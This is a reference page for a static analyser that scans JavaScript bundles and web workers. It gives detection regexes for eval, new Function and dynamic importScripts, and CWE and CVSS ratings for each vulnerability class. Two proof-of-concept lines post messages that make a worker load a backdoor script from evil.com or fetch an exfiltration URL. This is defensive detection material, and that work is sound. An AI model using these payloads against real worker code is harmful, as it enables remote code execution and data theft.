# Static Patterns — Bundle/Worker Analysis

> **CAMADA=IA | DOMINIO=WEB, Supply Chain | SEGURANCA=Worker Security, Static Analysis | PILARES=8/8**

## Static Pattern Table

| Pattern | Regex | Severity |
|---|---|---|
| Dynamic importScripts | `/importScripts\s*\(\s*([^)]+)\s*\)/g` with dynamic param check | HIGH |
| eval usage | `/\beval\s*\(/g` | HIGH |
| Function constructor | `/new\s+Function\s*\(/g` | HIGH |
| Worker creation code | `/new\s+Worker\s*\(\s*([^)]+)\s*\)/g` | INFO |
| Embedded worker patterns | Multi-pattern regex (3 heuristics) | Varies |

## Vulnerability Classes

### CWE-94 — Dynamic importScripts without Validation
- **Severity:** HIGH → CRITICAL (when active)
- **CVSS:** 7.5 (base) / 9.5 (critical)
- **Impact:** Arbitrary code execution within the worker thread
- **OWASP:** A03:2021 – Injection
- **Detection:** Regex with absence of validation guards (includes, startsWith, match, ===, WHITELIST)
- **PoC:** `worker.postMessage('https://evil.com/backdoor.js');`

### CWE-346 — postMessage without Origin Validation
- **Severity:** MEDIUM
- **CVSS:** 5.3
- **Impact:** Cross-origin data leakage; XSS escalation
- **Detection:** `self.postMessage` count > 0 and `e.origin`/`event.origin` === 0

### CWE-95 — eval or Function Constructor Usage
- **Severity:** HIGH → CRITICAL
- **CVSS:** 8.1 / 10.0 (critical)
- **Impact:** Remote code execution
- **PoC:** `worker.postMessage({cmd: 'fetch("https://evil.com/exfil")'});`

### CWE-755 — JSON.parse without Error Handling
- **Severity:** LOW
- **CVSS:** 3.7
- **Impact:** Denial of Service (worker crash)
- **Detection:** `JSON.parse(` without `try { ... } catch`

### CWE-918 — SSRF via Dynamic fetch URL
- **Severity:** MEDIUM
- **CVSS:** 6.5
- **Impact:** SSRF, internal network scanning
- **Detection:** `/fetch\s*\([^)]*\+[^)]*\)/`
